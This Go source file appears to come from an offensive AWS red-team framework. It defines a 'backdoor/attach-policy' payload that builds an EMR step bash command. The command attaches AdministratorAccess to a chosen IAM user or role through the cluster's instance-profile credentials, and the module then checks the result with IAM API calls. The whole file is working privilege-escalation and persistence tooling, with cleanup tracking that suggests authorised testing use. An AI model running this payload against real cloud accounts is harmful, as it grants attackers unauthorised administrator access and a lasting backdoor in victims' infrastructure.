package emr

import (
	"context"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload attaches a managed policy to an IAM user or role via an
// EMR step command. The EMR master node runs this bash command using the instance
// profile's credentials — no code artifact upload is needed; the command is embedded
// directly in the step args at cluster creation time.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an IAM user or role via an EMR step command"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceEMR,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN, tries both if plain name)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach (defaults to AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode returns the bash command to embed in an EMR step's Args field.
// The command is executed on the master node using the instance profile's credentials.
// Values are interpolated directly because EMR steps have no env-var injection mechanism.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	principalName, principalType := parsePrincipalARN(targetARN)
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	// Build the attach command based on detected principal type.
	// If type is unknown (plain name), try user first then role.
	var attachCommand string
	switch principalType {
	case "role":
		attachCommand = fmt.Sprintf("aws iam attach-role-policy --role-name %s --policy-arn %s", principalName, policyArn)
	case "user":
		attachCommand = fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", principalName, policyArn)
	default:
		// Plain name — try user first, fall back to role
		attachCommand = fmt.Sprintf(
			"aws iam attach-user-policy --user-name %s --policy-arn %s 2>/dev/null || aws iam attach-role-policy --role-name %s --policy-arn %s",
			principalName, policyArn, principalName, policyArn,
		)
	}

	return attachCommand, nil
}

// ProcessResult formats execution output for display.
// EMR steps produce no captured response — the module polls cluster state instead.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// VerifySuccess checks whether the target principal has the policy attached.
// Uses iam:ListAttachedUserPolicies (or ListAttachedRolePolicies) for the target.
// Called by the module after the cluster terminates.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	targetARN := options["TARGET_ARN"]
	principalName, principalType := parsePrincipalARN(targetARN)
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	iamClient := iam.NewFromConfig(config)

	if principalType == "role" {
		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
			RoleName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
		return false, nil
	}

	// Default to user (plain names assumed to be user based on demo attack pattern)
	result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
		UserName: aws.String(principalName),
	})
	if err != nil {
		return false, nil
	}
	for _, policy := range result.AttachedPolicies {
		if aws.ToString(policy.PolicyArn) == policyArn {
			return true, nil
		}
	}
	return false, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification for cleanup.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, "AdministratorAccess"),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

// parsePrincipalARN extracts the principal name and type from an ARN or plain name.
func parsePrincipalARN(input string) (name string, principalType string) {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":role/"); idx != -1 {
			return input[idx+len(":role/"):], "role"
		}
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):], "user"
		}
	}
	// Plain name — caller is likely a user based on the emr-001 attack pattern
	return input, "user"
}
